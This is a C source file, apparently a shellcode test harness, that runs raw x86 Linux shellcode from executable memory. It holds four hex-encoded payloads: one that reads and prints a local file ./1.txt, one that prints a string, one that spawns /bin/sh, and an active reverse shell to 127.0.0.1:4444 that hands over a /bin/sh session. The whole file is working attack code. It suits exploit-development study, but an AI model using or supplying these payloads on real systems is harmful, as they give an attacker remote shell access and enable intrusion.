#include <sys/mman.h>
#include <errno.h>
#include <string.h>
#include <stdio.h>

// Opens ./1.txt
// char shellcode[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xe9\x3e\x00\x00\x00\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xe9\x00\x00\x00\x00\x89\xf3\xb0\x03\x81\xec\x01\x00\x00\x00\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\x13\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x81\xc4\x01\x00\x00\x00\xe9\xd6\xff\xff\xff\xb0\x01\x31\xd2\xcd\x80\xe8\xbd\xff\xff\xff\x31\x2e\x74\x78\x74";

// Print "boddicheg"
// char shellcode[] = "\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x12\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x62\x6f\x64\x64\x69\x63\x68\x65\x67";

// Spawn /bin/sh
// char shellcode[] = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";

// Reverse shell on localhost:4444
char shellcode[] = "\x89\xe5\x31\xc0\x31\xc9\x31\xd2\x50\x50\xb8\xff\xff\xff\xff\xbb\x80\xff\xff\xfe\x31\xc3\x53\x66\x68\x11\x5c\x66\x68\x02\x00\x31\xc0\x31\xdb\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x66\xb8\x6a\x01\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x41\xe2\xf6\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";

int main(int argc, char **argv)
{
  char *buf;
  int prot = PROT_READ | PROT_WRITE | PROT_EXEC;
  int flags = MAP_PRIVATE | MAP_ANONYMOUS;

  buf = mmap(0, sizeof(shellcode), prot, flags, -1, 0);
  memcpy(buf, shellcode, sizeof(shellcode));

  ((void (*)(void))buf)();

  return 0;
}